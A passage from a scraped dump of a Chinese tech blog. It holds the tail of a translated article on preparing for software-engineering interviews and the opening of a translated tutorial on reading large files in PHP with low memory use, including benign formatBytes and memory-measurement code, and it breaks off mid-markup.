搜索答案，发送电子邮件寻求帮助和使用外部工具包这些做法。因为能否通过特定领域面试最重要的一个衡量标准是你能否构建出有效的产品。</p>\n<p><strong>计算机科学基础知识面试</strong></p>\n<p>计算机科学和基础编程面试明显不同于上文所探讨的特定领域面试。计算机科学和基础编程面试是为了评估你解决问题的能力，更多的是关注找到最佳解决方案的能力，而不是简单的去完成某些特定任务。因此，面试官通常也不会问关于你是谁、你过去的工作经历或者你构建过的项目方面的问题。对于计算机科学基础面试这一类型来说，面试官的工作就是评估你的原始编程能力，通常他们是通过数据结构和算法相关的问题来进行评估。</p>\n<p>计算机科学基础面试的问题有章法可循。因为学习数据结构和算法需要大量的准备工作和长时间的学习，你需要了解你所选择的编程语言、数据结构和算法来解决问题。计算机科学基础知识面试通常可以用六种不同类型的算法来解决：</p>\n<ul>\n<li>深度优先搜索算法/广度优先搜索算法</li>\n<li>贪心算法</li>\n<li>滑动窗口算法</li>\n<li>分治算法</li>\n<li>递归算法</li>\n<li>动态规划算法</li>\n</ul>\n<p>你需要研究每一种算法，可以在 Pramp 上与其他软件工程师一起练习面试和面试问题。应对面试是一门独立于软件工程师之外的技能，你可以通过练习和重复来提升自己在面试时的表现。</p>\n<p>计算机科学基础知识面试通常遵循的那些问题结构对于求职者来说只有通过几个小时的练习和准备才能发现。即便这些知识中的一部分并不适用于日常的编程任务，但只要你坚持这样做，你就能抓住更多的面试机会，就能收到更多公司发来的 offer。如果你的目标是获得更多的工作机会，那你一定要看一下《Cracking The Coding Interview》这本书，并且查看<a href=\"https://github.com/connor11528/coding-interviews\" target=\"_self\">这一免费的面试资源</a>来进行相应的准备工作。</p>\n<p><strong>哪种方法适合你？</strong></p>\n<p>作为一名正在寻找工作的软件工程师来说，在构建产品、学习新工具和练习面试之间存在着一定程度的相互冲突。选择关注哪一点其实取决于你所寻找的工作类型，如果你想进入 Google、Twitch、亚马逊、Uber 或 Square 等大型知名科技公司工作，那你基础知识一定要过关。在这样的情况下，你是否构建过最好、最复杂的产品其实并不重要，如果你无法通过计算机科学基础知识面试，那这些大型科技公司是绝对不会雇用你的。</p>\n<p>相比较而言，小型初创企业通常是在与时间赛跑，他们会争取快速的构建出产品、推出产品并且推向市场。因此，这些公司通常会实行特定领域面试方式，因为他们希望了解捏可以构建什么样的产品，你最拿手的技术又是什么。</p>\n<p><strong>如何了解公司面试类型</strong></p>\n<p>在进行公司面试时，与你对接的招聘人员或者公司联系人就是你最好的朋友。你可以直接向他们询问关于公司的招聘流程以及他们用于评估候选人的标准等方面的问题。对于求职者来说，了解公司在招岗位的信息是非常重要的一点，因此他们需要主动提出这方面的问题并且仔细研究招聘职位描述信息。软件工程岗位招聘通常有好几个环节，可能包括电话面试、共享桌面远程面试和现场面试环节。</p>\n<p>如果面试环节包括共享桌面远程面试这一环节，那最有可能考察的是求职者的计算机科学基础知识。他们会提供给求职者一个需要解决的问题，面试官会在这个过程中观察求职者的操作，求职者也可以解释自己的想法。</p>\n<p>带回家做的项目通常考察的是特定领域的具体知识，这在一些机构和初创企业的招聘中比较常见，求职者需要在 24-48 小时内有所成就，之后再对你的代码进行展示。</p>\n<p>普通的电话面试通常了解的是求职者的态度，进行相应的沟通并了解一些背景信息、招聘人员很难通过这已通电话获得有关你能力方面的信息。</p>\n<p>现场面试可以涵盖任何问题，但通常是整个面试过程的最后一个环节。所以到这一环节，你应该是对你面前的这个机遇以及求职公司所用的评估方式有了一个清晰的认识。</p>\n<p>想了解各个公司使用的是哪种类型的面试，你可以通过浏览 Glassdoor、Angel.co 上的评论或者是通过 Linkedin 联系公司当前员工的方式来获知。</p>\n<p><strong>小结</strong></p>\n<p>求职者可以通过与求职公司的招聘人员和联系人员交谈，来了解大致的面试过程。如果你不熟悉数据结构和算法，可以通过 Pramp 进行练习。做好心理准备，你可能需要细数你过去的工作经历和你已经构建而成的软件。要想在软件工程领域找到一份新工作，构建过令人惊叹的产品与了解计算机课科学基础知识这两方面同等重要。</p>\n<p>“你越是不自信，就越是需要认真地采取行动。” – Tara Ploughman</p>\n<p>记住这一点，并不只是公司在面试你，同时你也在面试这个公司。面试过程中你需要去处理的问题和工作往往与你被聘用之后，在这个岗位上需要去完成的工作类似。所以，你需要思考这样几个问题：他们为你安排的挑战是你所喜欢的工作类型吗？这个公司的人好吗？他们尊重你的时间和能力吗？如果这些问题的答案都是否定的，那你可以考虑寻找别的工作机会了。了解自己的长处和短处，并且享受这个找工作的过程。面试是一个很好的认识人的方式，也可是一种学习到新技术并且了解自己需求的途径。</p>\n<p>失败和被拒本来就是生活的一部分，所以在任何时候，都要保持积极的心态，努力争取那些你所能控制的部分，对于超出自己控制的部分不要去过多的理会。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"112148\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"112148votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"112148\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 4 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/bd771b06968108ecbf8c58a5a55983c0915a35f5.jpg"}
{"url_object_id": "14c027911b193616950f9c0ad1de58fd", "title": "如何在不会导致服务器宕机的情况下，用 PHP 读取大文件", "url": "http://blog.jobbole.com/113339/", "create_date": "2017/12/17", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/01/ee9bc25f0b5757b6f90f093b53eb2271.jpg"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 3, "tags": "IT技术,php", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.sitepoint.com/performant-reading-big-files-php/\">Christopher Pitt</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/performant-reading-big-files-php\">开源中国</a>   </div><p><strong>作为PHP开发人员，我们并不经常需要担心内存管理。PHP 引擎在我们背后做了很好的清理工作，短期执行上下文的 Web 服务器模型意味着即使是最潦草的代码也不会造成持久的影响。</strong></p>\n<p>很少情况下我们可能需要走出这个舒适的地方 ——比如当我们试图在一个大型项目上运行 Composer 来创建我们可以创建的最小的 VPS 时，或者当我们需要在一个同样小的服务器上读取大文件时。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/60a1bd66a2c254a6123189a62d5ba656.jpg\" width=\"400\" height=\"400\"></p>\n<p>后面的问题就是我们将在本教程中深入探讨的。</p>\n<p>在 <a href=\"https://github.com/sitepoint-editors/sitepoint-performant-reading-of-big-files-in-php\" target=\"_blank\" rel=\"nofollow\">GitHub</a>上可以找到本教程的源码。</p>\n<h2>衡量成功的标准</h2>\n<p>确保我们对代码有改进的唯一方法是测试一个不好的情况，然后将我们修复之后的测量与另一个进行比较。换句话说，除非我们知道“解决方案”对我们有多大的帮助（如果有的话），否则我们不知道它是否真的是一个解决方案。</p>\n<p>这里有两个我们可以关系的衡量标准。首先是CPU使用率。我们要处理的进程有多快或多慢？第二是内存使用情况。脚本执行时需要多少内存？这两个通常是成反比的 – 这意味着我们可以以CPU使用率为代价来降低内存使用，反之亦然。</p>\n<p>在一个异步执行模型（如多进程或多线程的PHP应用程序）中，CPU和内存的使用率是很重要的考量因素。在传统的PHP架构中，当任何一个值达到服务器的极限时，这些通常都会成为问题。</p>\n<p>测量PHP内的CPU使用率是不切实际的。如果这是你要关注的领域，请考虑在Ubuntu或MacOS上使用类似top的工具。对于Windows，请考虑使用Linux子系统，以便在Ubuntu中使用top。</p>\n<p>为了本教程的目的，我们将测量内存使用情况。我们将看看在“传统”的脚本中使用了多少内存。我们将执行一些优化策略并对其进行度量。最后，我希望你能够做出一个有经验的选择。<br>\n我们查看内存使用多少的方法是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c94b750157307\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// formatBytes is taken from the php.net documentation\r\n\r\nmemory_get_peak_usage();\r\n\r\nfunction formatBytes($bytes, $precision = 2) {\r\n    $units = array(\"b\", \"kb\", \"mb\", \"gb\", \"tb\");\r\n\r\n    $bytes = max($bytes, 0);\r\n    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));\r\n    $pow = min($pow, count($units) - 1);\r\n\r\n    $bytes /= (1 &lt;&lt; (10 * $pow));\r\n\r\n    return round($bytes, $precision) . \" \" . $units[$pow];\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c94b750157307-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c94b750157307-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c94b750157307-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c94b750157307-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c94b750157307-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c94b750157307-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c94b750157307-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c94b750157307-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c94b750157307-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c94b750157307-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c94b750157307-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c94b750157307-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c94b750157307-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c94b750157307-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c94b750157307-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c94b750157307-1\"><span class=\"crayon-c\">// formatBytes is taken from the php.net documentation</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c94b750157307-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c94b750157307-3\"><span class=\"crayon-e\">memory_get_peak_usage</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c94b750157307-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c94b750157307-5\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">formatBytes</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">precision</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c94b750157307-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">units</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">array</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"b\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"kb\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"mb\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"gb\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"tb\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c94b750157307-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c94b750157307-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c94b750157307-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">floor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1024</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c94b750157307-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">min</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">units</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c94b750157307-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c94b750157307-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c94b750157307-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c94b750157307-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">round</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">precision</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\" \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">units</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c94b750157307-15\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p>我们将在脚本的最后使用这些函数，以便我们能够看到哪个脚本一次使用最大的内存。</p>\n<h3>我们的选择是什么？</h3>\n<p>这里有很多方法可以有效地读取文件。但是也有两种我们可能使用它们的情况。我们想要同时读取和处理所有数据，输出处理过的数据或根据我们所读取的内容执行其他操作。我们也可能想要转换一个数据流，而不需要真正访问的数据。<br>\n让我们设想一下，对于第一种情况，我们希望读取一个文件，并且每10,000行创建一个独立排队的处理作业。我们需要在内存中保留至少10000行，并将它们传递给排队的工作管理器（无论采取何种形式）。<br>\n对于第二种情况，我们假设我们想要压缩一个特别大的API响应的内容。我们不在乎它的内容是什么，但我们需要确保它是以压缩形式备份的。<br>\n在这两种情况下，如果我们需要读取大文件，首先，我们需要知道数据是什么。第二，我们并不在乎数据是什么。让我们来探索这些选择吧…</p>\n<h2><strong>逐行读取文件</strong></h2>\n<p>有许多操作文件的函数，我们把部分结合到一个简单的文件阅读器中(封装为一个方法)：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc88c955985324167\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// from memory.php\r\n\r\nfunction formatBytes($bytes, $precision = 2) {\r\n    $units = array(\"b\", \"kb\", \"mb\", \"gb\", \"tb\");\r\n\r\n    $bytes = max($bytes, 0);\r\n    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));\r\n    $pow = min($pow, count($units) - 1);\r\n\r\n    $bytes /= (1 &lt;&lt; (10 * $pow));\r\n\r\n    return round($bytes, $precision) . \" \" . $units[$pow];\r\n}\r\n\r\nprint formatBytes(memory_get_peak_usage());</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c955985324167-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c955985324167-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c955985324167-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c955985324167-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c955985324167-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c955985324167-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c955985324167-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c955985324167-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c955985324167-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c955985324167-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c955985324167-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c955985324167-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c955985324167-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc88c955985324167-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc88c955985324167-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc88c955985324167-1\"><span class=\"crayon-c\">// from memory.php</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c955985324167-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc88c955985324167-3\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">formatBytes</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">precision</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c955985324167-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">units</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">array</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"b\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"kb\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"mb\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"gb\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"tb\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c955985324167-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c955985324167-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c955985324167-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">floor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">log</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1024</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c955985324167-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">min</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">pow</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">units</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc88c955985324167-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc88c955985324167-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">$</span><span 